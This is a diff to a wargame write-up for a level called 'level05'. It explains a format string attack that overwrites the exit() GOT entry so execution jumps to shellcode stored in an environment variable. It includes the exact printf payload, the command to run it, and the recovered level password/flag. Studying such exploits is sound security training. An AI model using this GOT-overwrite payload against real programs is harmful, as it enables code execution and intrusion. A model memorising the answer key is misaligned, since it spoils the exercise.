@@ -1,9 +1,8 @@
+# Overwrite got.plt table again
 
-
-# Overwrite .got.plt table again
+## Program summary
 
 On this level we are provided with a program which takes a string as input via the **`gets()`** function, in the case of uppercase alphabetic characters these are transformed into lowercase letters before being printed by **`printf()`**.
-
 ```
 08048444 <main>:
 ...
@@ -23,7 +22,8 @@ On this level we are provided with a program which takes a string as input via t
 8048507:	e8 34 fe ff ff       	call   8048340 <printf@plt>
 ```
 
-Since no sanitize takes place on our input and it is handled by printf, we can use a **format string attack**.
+## Vulnerability
+Since no sanitize takes place on our input and it is handled by **`printf()`**, we can use a **format string attack**.
 
 We notice at the same time that the program will end with an **`exit()`**, the address of the latter is not yet resolved at this stage of the program, so let’s replace the field in the **got.plt** table  :
 
@@ -38,6 +38,7 @@ We notice at the same time that the program will end with an **`exit()`**, the a
 0x80497e0 <exit@got.plt>:       0x08048376
 ```
 
+## Attack design
 Let's build our attack.
 
 First we will inject a spawn shell code into an environment variable ( *using a **NOP slide** with shellcode can help to make exploits more reliable, as it provides a "buffer" of NOP instructions that can help to align the program's execution flow with the shellcode. This can help to prevent the exploit from failing due to small variations in the branch target address* ) :
@@ -64,7 +65,7 @@ We notice that the address of the **env** var is a very large number, we will ha
 [__|__|__|__] -> ??? [ff|ff|d7|d9]
 ```
 
-```
+```py
 python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55249c%10$hn" + "%10278c%11$hn"' > /tmp/boom
 cat /tmp/boom - | ./level05
 ```
@@ -76,4 +77,4 @@ cat /home/users/level06/.pass
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
 
-> flag: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+> Flag : `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
